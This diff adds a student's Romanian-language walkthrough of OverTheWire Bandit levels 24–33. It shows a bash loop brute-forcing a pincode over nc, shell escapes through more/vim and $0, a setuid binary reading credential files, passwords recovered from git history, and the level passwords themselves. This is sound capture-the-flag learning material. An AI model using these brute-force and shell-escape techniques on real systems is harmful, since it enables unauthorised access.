@@ -1,0 +1,212 @@
+ZIUA 2-17.06.2022
+
+
+
+#LEVEL24->25
+#Ma conectez la portul 30002 folosind nc.
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+#Am creat si rulat urmatorul script. 
+  #!/bin/bash  
+  for i in {0000..9999}
+  do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"  >> fisier25
+  done  
+  cat fisier25 | nc localhost 30002 > parola_buna
+
+bandit24@bandit:/tmp/caran$ cat parola_buna
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+
+#LEVEL25->26
+bandit25@bandit:~$ ls
+bandit26.sshkey
+#Fisierul bandit26.sskey contine cheia privata pentru conectarea prin ssh.
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+#Conexiunea este inchisa imediat.
+#Aflu care este shellul pentru bandit26.
+bandit25@bandit:~$ cat /etc/passwd | egrep "bandit26"
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+#Shellul este:/usr/bin/showtext
+andit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+
+#Micsoram terminalul curent pentru a forta executia comenzii more.
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+#Apas tasta v pt a intra in vim.
+#:e /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z  
+
+
+
+#LEVEL26->27
+#Ma conectez folosind parola obtinuta.
+#Am nevoie de shellul /bin/bash pentru a face rost de noua parola.
+#Apas tasta v pentru a intra in vim; :set shell=/bin/bash; :shell
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+#Verific tipul fisierului bandit27-do. 
+bandit26@bandit:~$ file bandit27-do
+bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+#Va fi executat cu permisiunile utilizatorului bandit27.
+#./bandit27-do va executa o comanda cu permisiunile utilizatorului bandit27
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+
+
+
+#LEVEL27->28
+#git-clone(1):Clone a repository into a new directory.
+#Creez un director in care sa clonez repository-ul .
+bandit27@bandit:~$ mkdir /tmp/caran
+bandit27@bandit:/tmp/caran$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+bandit27@bandit:/tmp/caran$ ls
+repo
+bandit27@bandit:/tmp/caran$ cd repo
+bandit27@bandit:/tmp/caran/repo$ ls
+README
+bandit27@bandit:/tmp/caran/repo$ cat README
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+
+
+
+#LEVEL28->29
+bandit28@bandit:~$ mkdir /tmp/caran28
+bandit28@bandit:~$ cd /tmp/caran28
+bandit28@bandit:/tmp/caran28$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+bandit28@bandit:/tmp/caran28/repo$ cat README.md
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+#Caut o versiune mai veche in care parola era stocata in clar.
+andit28@bandit:/tmp/caran28/repo$ git log 
+commit edd935d60906b33f0619605abd1689808ccdd5ee
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    fix info leak
+
+commit c086d11a00c0648d095d04c089786efef5e01264
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    add missing data
+
+commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    initial commit of README.md
+bandit28@bandit:/tmp/caran28/repo$ git checkout c086d11a00c0648d095d04c089786efef5e01264
+bandit28@bandit:/tmp/caran28/repo$ cat README.md
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: bbc96594b4e001778eee9975372716b2
+
+
+
+#LEVEL29->30
+bandit29@bandit:/tmp/caran29$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+bandit29@bandit:/tmp/caran29/repo$ git log
+bandit29@bandit:/tmp/caran29/repo$ git diff 208f463b5b3992906eabf23c562eda3277fea912 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7
+#Diferenta intre cele 2 commituri:
+- password: <no passwords in production!>
+#Caut si in celelalte branch-uri sa vad diferentele. 
+bandit29@bandit:/tmp/caran29/repo$ git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/dev
+  remotes/origin/master
+  remotes/origin/sploits-dev
+#Verific in toate branchurile. 
+bandit29@bandit:/tmp/caran29/repo$ git checkout remotes/origin/dev
+bandit29@bandit:/tmp/caran29/repo$ cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+
+
+
+#LEVEL30->31
+bandit30@bandit:~$ mkdir /tmp/caran30
+bandit30@bandit:~$ cd /tmp/caran30
+bandit30@bandit:/tmp/caran30$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+#Dupa ce am incercat diverse comenzi din manpage am descoperit acest tag.
+bandit30@bandit:/tmp/caran30/repo$ git tag
+secret
+bandit30@bandit:/tmp/caran30/repo$ git show secret
+47e603bb428404d265f59c42920d81e5
+
+
+
+#LEVEL31->32
+bandit31@bandit:~$ mkdir /tmp/caran31
+bandit31@bandit:~$ cd /tmp/caran31
+bandit31@bandit:/tmp/caran31$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+bandit31@bandit:/tmp/caran31/repo$ git log
+commit 701b33b545902a670a46088731949ae040983d80
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:56 2020 +0200
+
+    initial commit
+bandit31@bandit:/tmp/caran31/repo$ git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/master
+bandit31@bandit:/tmp/caran31/repo$ 
+bandit31@bandit:/tmp/caran31/repo$ git checkout remotes/origin/master
+Note: checking out 'remotes/origin/master'.
+#Verific commitul din remotes/origin/master.
+bandit31@bandit:/tmp/caran31/repo$ cat README.md
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+#Creez fisierul key.txt cu continutul precizat.
+bandit31@bandit:/tmp/caran31/repo$ cat key.txt
+May I come in?
+bandit31@bandit:/tmp/caran31/repo$ git add key.txt
+bandit31@bandit:/tmp/caran31/repo$ ls -a
+.  ..  .git  .gitignore  key.txt  README.md
+#A fost creat fisierul .gitignore
+#A gitignore file specifies intentionally untracked files that Git should ignore.
+#Sunt ignorate fisierele cu extensia .txt.
+#Sterg acest fisier. 
+bandit31@bandit:/tmp/caran31/repo$ rm .gitignore
+bandit31@bandit:/tmp/caran31/repo$ git add key.txt
+#Voi inregistra modificarile in repository.
+bandit31@bandit:/tmp/caran31/repo$ git commit -m “First commit”
+#git-push(1):Update remote refs along with associated objects.
+bandit31@bandit:/tmp/caran31/repo$ git push origin
+#Parola pentru nivelul urmator este: 56a9bf19c63d650ce78e6ec0354ee45e
+
+
+
+#LEVEL32->33
+caran_raluca@caran:~$ ssh bandit32@bandit.labs.overthewire.org -p 2220 
+#Shell-ul transforma toate comenzile in litere mari. Nu executa nicio comanda. 
+#Dam comanda $0 pentru a putea folosi shellul bash.
+# $0-refer to the name of your current shell.
+$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
